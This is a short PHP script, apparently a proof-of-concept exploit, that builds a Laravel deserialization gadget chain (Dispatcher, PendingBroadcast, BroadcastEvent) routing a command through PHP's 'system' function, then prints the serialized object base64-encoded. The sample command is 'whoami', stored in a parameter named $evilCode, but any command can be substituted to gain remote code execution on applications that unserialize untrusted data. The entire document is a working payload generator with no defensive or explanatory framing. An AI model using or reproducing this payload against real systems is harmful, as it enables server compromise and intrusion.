<?php

namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver;

        function __construct()
        {
            $this->queueResolver = "system";
        }
    }
}

namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;

        function __construct($evilCode)
        {
            $this->events = new \Illuminate\Bus\Dispatcher();
            $this->event = new BroadcastEvent($evilCode);
        }
    }

    class BroadcastEvent {
        public $connection;

        function __construct($evilCode)
        {
            $this->connection = $evilCode;
        }

    }
}


namespace {
    $pendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast("whoami");
    print_r(base64_encode(serialize($pendingBroadcast)));
}